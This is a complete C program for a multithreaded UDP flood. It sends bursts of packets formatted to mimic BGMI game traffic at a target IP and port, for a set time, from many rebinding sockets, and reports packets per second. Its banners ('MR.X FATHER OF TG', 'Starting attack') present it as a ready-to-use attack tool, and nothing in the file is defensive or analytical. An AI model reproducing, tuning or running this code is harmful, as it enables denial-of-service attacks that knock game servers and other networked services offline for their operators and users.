#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>

#define MAX_SOCKETS 100
#define MAX_THREADS 150
#define MIN_PACKET_SIZE 64
#define MAX_PACKET_SIZE 1024
#define MIN_TIME 10
#define MAX_TIME 600
#define BATCH_SIZE 5000
#define DEFAULT_BUFFER_SIZE 2097152
#define PORT_RANGE 40000
#define MIN_PORT 15000
#define RECONNECT_LIMIT 30000
#define MAX_ATTACK_SECONDS 600

char TARGET_IP[INET_ADDRSTRLEN];
int TARGET_PORT;
int ATTACK_DURATION;
int PACKET_SIZE_VALUE;
int THREAD_COUNT_VALUE;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long current_pps = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_all = 0;

struct sockaddr_in target_addr;

void handle_signal(int sig) {
    atomic_store(&stop_all, 1);
}

unsigned int fast_random(unsigned int *seed) {
    *seed = (*seed * 1103515245 + 12345);
    return *seed;
}

int setup_socket(int sock) {
    int buffer_size = DEFAULT_BUFFER_SIZE;
    int reuse = 1;
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size)) < 0) {
        buffer_size = 65536;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    }
    
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    #ifdef SO_REUSEPORT
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    #endif
    
    return 0;
}

void make_bgmi_packet(char *buffer, int size, int thread_id, unsigned int seq, unsigned int *seed) {
    int actual_size = size;
    if (actual_size > MAX_PACKET_SIZE) actual_size = MAX_PACKET_SIZE;
    if (actual_size < MIN_PACKET_SIZE) actual_size = MIN_PACKET_SIZE;
    
    memset(buffer, 0, actual_size);
    
    buffer[0] = 0x42;
    buffer[1] = 0x47;
    buffer[2] = 0x4D;
    buffer[3] = 0x49;
    
    unsigned int *header = (unsigned int*)(buffer + 4);
    
    unsigned int types[] = {htonl(0x00010001), htonl(0x00010002), htonl(0x00020001), htonl(0x00030001)};
    int type_idx = (thread_id + seq) % 4;
    header[0] = types[type_idx];
    
    header[1] = htonl(seq + thread_id * 100000);
    header[2] = htonl((unsigned int)time(NULL));
    header[3] = htonl(0x00000001 + (seq % 5));
    
    int payload_start = 20;
    if (payload_start >= actual_size) payload_start = actual_size - 1;
    
    for (int i = payload_start; i < actual_size; i++) {
        buffer[i] = (fast_random(seed) + i + thread_id + seq) & 0xFF;
    }
    
    if ((fast_random(seed) % 100) < 15) {
        buffer[4] = 0xFF;
        buffer[5] = 0xFF;
    }
}

int create_and_bind_socket(unsigned int *seed) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    if (setup_socket(sock) < 0) {
        close(sock);
        return -1;
    }
    
    if (fcntl(sock, F_SETFL, O_NONBLOCK) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in local_addr;
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(MIN_PORT + (fast_random(seed) % PORT_RANGE));
    local_addr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) != 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

void *flood_thread(void *arg) {
    int thread_id = *((int *)arg);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = (thread_id * 1234567) ^ getpid() ^ (tv.tv_usec & 0xFFFF);
    
    int sock = create_and_bind_socket(&seed);
    if (sock < 0) return NULL;
    
    char *packet_buffer = malloc(PACKET_SIZE_VALUE);
    if (!packet_buffer) {
        close(sock);
        return NULL;
    }
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int sequence = thread_id * 77777;
    unsigned int sent_count = 0;
    
    while (!atomic_load(&stop_all)) {
        if (sent_count > RECONNECT_LIMIT) {
            close(sock);
            sock = create_and_bind_socket(&seed);
            sent_count = 0;
            if (sock < 0) {
                free(packet_buffer);
                return NULL;
            }
        }
        
        make_bgmi_packet(packet_buffer, PACKET_SIZE_VALUE, thread_id, sequence, &seed);
        
        int burst = 30 + (fast_random(&seed) % 40);
        for (int i = 0; i < burst && !atomic_load(&stop_all); i++) {
            int result = sendto(sock, packet_buffer, PACKET_SIZE_VALUE, MSG_DONTWAIT,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
            if (result > 0) {
                local_packets++;
                local_bytes += result;
                sequence++;
                sent_count++;
            }
        }
        
        if (local_packets >= 2500) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(2000);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    free(packet_buffer);
    if (sock >= 0) close(sock);
    return NULL;
}

void *heavy_flood(void *arg) {
    int thread_id = *((int *)arg);
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = (thread_id * 7654321) ^ getpid() ^ (tv.tv_usec & 0xFFFF);
    
    int sockets[MAX_SOCKETS];
    char *packets[MAX_SOCKETS];
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sockets[i] = -1;
        packets[i] = NULL;
    }
    
    int active_sockets = 0;
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sockets[i] = create_and_bind_socket(&seed);
        if (sockets[i] < 0) continue;
        
        packets[i] = malloc(PACKET_SIZE_VALUE);
        if (!packets[i]) {
            close(sockets[i]);
            sockets[i] = -1;
            continue;
        }
        active_sockets++;
    }
    
    if (active_sockets == 0) return NULL;
    
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    unsigned int sequence = thread_id * 100000;
    unsigned int sent_counts[MAX_SOCKETS];
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sent_counts[i] = 0;
    }
    
    while (!atomic_load(&stop_all)) {
        for (int i = 0; i < MAX_SOCKETS && !atomic_load(&stop_all); i++) {
            if (sockets[i] < 0 || !packets[i]) continue;
            
            if (sent_counts[i] > RECONNECT_LIMIT) {
                close(sockets[i]);
                sockets[i] = create_and_bind_socket(&seed);
                sent_counts[i] = 0;
                if (sockets[i] < 0) {
                    free(packets[i]);
                    packets[i] = NULL;
                    continue;
                }
            }
            
            make_bgmi_packet(packets[i], PACKET_SIZE_VALUE, thread_id + 1000, sequence, &seed);
            
            int burst = 15 + (fast_random(&seed) % 25);
            for (int b = 0; b < burst && !atomic_load(&stop_all); b++) {
                int result = sendto(sockets[i], packets[i], PACKET_SIZE_VALUE, MSG_DONTWAIT,
                                  (struct sockaddr*)&target_addr, sizeof(target_addr));
                if (result > 0) {
                    local_packets++;
                    local_bytes += result;
                    sequence++;
                    sent_counts[i]++;
                }
            }
        }
        
        if (local_packets >= BATCH_SIZE) {
            atomic_fetch_add(&total_packets, local_packets);
            atomic_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
        
        usleep(1000);
    }
    
    if (local_packets > 0) {
        atomic_fetch_add(&total_packets, local_packets);
        atomic_fetch_add(&total_bytes, local_bytes);
    }
    
    for (int i = 0; i < MAX_SOCKETS; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
        }
        if (packets[i]) {
            free(packets[i]);
        }
    }
    
    return NULL;
}

void *show_stats(void *arg) {
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    time_t last_time = 0;
    
    int first_run = 1;
    int stat_count = 0;
    
    while (!atomic_load(&stop_all)) {
        sleep(2);
        
        time_t now = time(NULL);
        if (first_run) {
            last_packets = atomic_load(&total_packets);
            last_bytes = atomic_load(&total_bytes);
            last_time = now;
            first_run = 0;
            continue;
        }
        
        int elapsed = now - last_time;
        if (elapsed <= 0) {
            continue;
        }
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        if (current_packets < last_packets) {
            last_packets = current_packets;
            last_bytes = current_bytes;
            last_time = now;
            continue;
        }
        
        unsigned long long packet_diff = current_packets - last_packets;
        unsigned long long byte_diff = current_bytes - last_bytes;
        
        double pps = (double)packet_diff / elapsed;
        double megabytes = byte_diff / (1024.0 * 1024.0);
        
        atomic_store(&current_pps, (unsigned long long)pps);
        
        unsigned long long current_peak = atomic_load(&peak_pps);
        if (pps > current_peak) {
            atomic_store(&peak_pps, (unsigned long long)pps);
        }
        
        printf("🔥  PPS: %.0fK | Peak: %lluK | %.1fMB\n", 
               pps/1000, atomic_load(&peak_pps)/1000, megabytes);
        
        stat_count++;
        if (stat_count % 3 == 0) {
            printf("\n");
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = now;
    }
    
    return NULL;
}

void *run_timer(void *arg) {
    int *duration = (int *)arg;
    for (int i = 0; i < *duration && !atomic_load(&stop_all); i++) {
        sleep(1);
    }
    atomic_store(&stop_all, 1);
    return NULL;
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n", argv[0]);
        return 1;
    }
    
    strncpy(TARGET_IP, argv[1], sizeof(TARGET_IP)-1);
    TARGET_IP[sizeof(TARGET_IP)-1] = '\0';
    
    char *endptr;
    TARGET_PORT = (int)strtol(argv[2], &endptr, 10);
    if (*endptr != '\0' || TARGET_PORT <= 0 || TARGET_PORT > 65535) {
        printf("Invalid port: %s\n", argv[2]);
        return 1;
    }
    
    ATTACK_DURATION = (int)strtol(argv[3], &endptr, 10);
    if (*endptr != '\0' || ATTACK_DURATION < MIN_TIME) ATTACK_DURATION = MIN_TIME;
    if (ATTACK_DURATION > MAX_TIME) ATTACK_DURATION = MAX_TIME;
    
    PACKET_SIZE_VALUE = (int)strtol(argv[4], &endptr, 10);
    if (*endptr != '\0' || PACKET_SIZE_VALUE < MIN_PACKET_SIZE) PACKET_SIZE_VALUE = MIN_PACKET_SIZE;
    if (PACKET_SIZE_VALUE > MAX_PACKET_SIZE) PACKET_SIZE_VALUE = MAX_PACKET_SIZE;
    
    THREAD_COUNT_VALUE = (int)strtol(argv[5], &endptr, 10);
    if (*endptr != '\0' || THREAD_COUNT_VALUE < 10) THREAD_COUNT_VALUE = 10;
    if (THREAD_COUNT_VALUE > MAX_THREADS) THREAD_COUNT_VALUE = MAX_THREADS;
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    struct timeval tv;
    gettimeofday(&tv, NULL);
    unsigned int seed = tv.tv_usec ^ getpid() ^ ((unsigned int)time(NULL) << 16);
    srand(seed);
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    atomic_store(&total_packets, 0);
    atomic_store(&total_bytes, 0);
    atomic_store(&current_pps, 0);
    atomic_store(&peak_pps, 0);
    atomic_store(&stop_all, 0);
    
    printf("\n🔥 MR.X FATHER OF TG 🔥\n\n");
    printf("🎯 Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("⏰ Time: %d | 📦 Packet: %d\n", ATTACK_DURATION, PACKET_SIZE_VALUE);
    printf("👥 Threads: %d\n\n", THREAD_COUNT_VALUE);
    
    int heavy_thread_id = 999999;
    pthread_t heavy_thread;
    if (pthread_create(&heavy_thread, NULL, heavy_flood, &heavy_thread_id) != 0) {
        printf("Failed to create heavy thread\n");
        return 1;
    }
    
    pthread_t *threads = malloc(THREAD_COUNT_VALUE * sizeof(pthread_t));
    int *thread_ids = malloc(THREAD_COUNT_VALUE * sizeof(int));
    
    if (!threads || !thread_ids) {
        printf("Memory allocation failed\n");
        atomic_store(&stop_all, 1);
        pthread_join(heavy_thread, NULL);
        free(threads);
        free(thread_ids);
        return 1;
    }
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT_VALUE; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, flood_thread, &thread_ids[i]) == 0) {
            threads_created++;
        } else {
            thread_ids[i] = -1;
        }
        usleep(1000);
    }
    
    printf("Starting attack with %d threads...\n\n", threads_created);
    
    pthread_t timer_thread;
    if (pthread_create(&timer_thread, NULL, run_timer, &ATTACK_DURATION) != 0) {
        printf("Failed to create timer thread\n");
        atomic_store(&stop_all, 1);
    }
    
    pthread_t stats_thread;
    if (pthread_create(&stats_thread, NULL, show_stats, NULL) != 0) {
        printf("Failed to create stats thread\n");
        atomic_store(&stop_all, 1);
    }
    
    pthread_join(timer_thread, NULL);
    
    atomic_store(&stop_all, 1);
    
    pthread_join(heavy_thread, NULL);
    
    for (int i = 0; i < THREAD_COUNT_VALUE; i++) {
        if (thread_ids[i] != -1) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(stats_thread, NULL);
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    
    if (ATTACK_DURATION > 0) {
        double avg_pps = final_packets / (double)ATTACK_DURATION;
        double total_gb = final_bytes / (1024.0 * 1024.0 * 1024.0);
        
        printf("\n🚀 MR.X NEVER END 🚀\n\n");
        printf("✅ Total Packets: %llu\n", final_packets);
        printf("🚀 AVERAGE PPS: %.0fK\n", avg_pps/1000);
        printf("💾 Total Data: %.2fGB\n", total_gb);
    }
    
    free(threads);
    free(thread_ids);
    
    return 0;
}